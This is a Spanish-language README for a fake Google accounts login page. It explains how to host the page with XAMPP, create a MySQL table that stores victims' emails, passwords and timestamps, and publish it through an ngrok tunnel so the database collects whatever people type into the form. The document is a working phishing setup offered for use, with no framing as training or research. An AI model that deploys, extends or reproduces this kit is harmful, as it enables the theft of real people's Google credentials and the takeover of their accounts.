# GoogleLogin

Inicio falso de google accounts.

    Para poder empezar a funcionar con la pagina, necesitas instalar XAMPP. Una vez instalado y copiado el repositorio, mueva la carpeta a la siguiente dirección: DISCO:\xampp\htdocs. Aquí pone la carpeta que descargaste del repositorio. Una vez hecho esto, es necesario en la app de XAMPP, activar Apache y MySQL. Una vez hecho esto deberías ir al archivo "config.php", podrás leer que están las zonas de "$host, $user, $psw, $db_name y $tb_name". Principalmente hay que configurar el Password en el caso de que haya alguna para su MySQL, por determinado no tiene. Ahora tendrás que crear una base de datos en MySQL usando XAMPP, la misma puede contener el mismo nombre que "$db_name", que es igual a "googlesignin", puedes usar este nombre o poner otro y sustituirlo en el archivo "config.php". Después, en esa base de datos de MySQL, tendrás que crear una tabla con el nombre de "$tb_name" (o otro nombre, pero tendrás que cambiarlo en config.php) y 4 columnas:

        1) ID, con la propiedad de entero, con índice primario y la propiedad "A_I" activada.

        2) email, con la principal propiedad VARCHAR y un largo de carácteres puede ser de 200.

        3) password, con las mismas propiedades que el email.

        4) fecha, con las mismas propiedades que el password.

    
    Algo que hay que tener claro, es que es importante tener XAMPP corriendo para que todo funcione. Una vez creada la tabla y la base de datos, ya tenemos todo listo, solo nos faltaría descargar Ngrok, para generar un tunel con nuestro proyecto y poder mostrarlo. Una vez instalado corremos en la consola de Ngrok el siguiente comando para correr nuestro servidor MySQL en la web:

        E:\Downloads\ngrok > ngrok http 80 

    El número 80, es el puerto en el que está abierto Apache, que normalmente se abre ahí si no hay algo más ocupando ese puerto. En el caso de que no funcione con ese puerto, mira en la app de XAMPP, ahí, en la fila de Apache aparecerá el puerto que está ocupando el mismo. Una vez creado el tunel, Ngrok te dejará una URL como la siguiente:

        # https://1abd-45-173-6-40.ngrok.io

    Luego, para poder acceder al proyecto añadimos /googlesignin, y listo, tenemos montada la base de datos para recibir los datos que metan en el fórmulario.

    Finalmente, la URL se vería de la siguiente manera:

        https://1abd-45-173-6-40.ngrok.io/googlesignin